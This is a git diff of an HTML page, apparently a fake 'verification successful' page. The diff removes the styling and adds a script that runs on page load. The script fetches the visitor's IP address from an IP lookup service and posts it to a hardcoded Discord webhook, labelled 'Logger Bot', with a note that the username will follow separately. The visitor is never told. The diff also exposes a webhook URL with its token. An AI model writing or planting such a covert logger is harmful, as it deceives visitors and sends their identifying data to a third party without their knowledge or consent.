@@ -1,24 +1,36 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verification Successful</title>
-  <style>
-    body {
-      background-color: #f9f9f9;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      font-family: Arial, sans-serif;
-      color: #333;
-      font-size: 24px;
-    }
-  </style>
+  <title>Logging...</title>
 </head>
 <body>
-  You have been successfully verified.
+  <h1>verification successful!</h1>
+
+  <script>
+    async function sendLog() {
+      // Fetch user's IP
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      const ip = data.ip;
+
+      // Your Discord webhook URL
+      const webhookURL = 'https://discord.com/api/webhooks/1365223944260554814/E4PX9F9VhRdjWhiE2prcWjsW1Z5wzSA7eTWYgDljpJXS-wSveRDrD9-iMNomw7eVJWZQ';
+
+      // Construct the message
+      const payload = {
+        username: "Logger Bot",
+        content: `**New User Log!**\nIP Address: ${ip}\n(Username will be posted separately)`
+      };
+
+      // Send it to Discord
+      await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    }
+
+    sendLog();
+  </script>
 </body>
 </html>
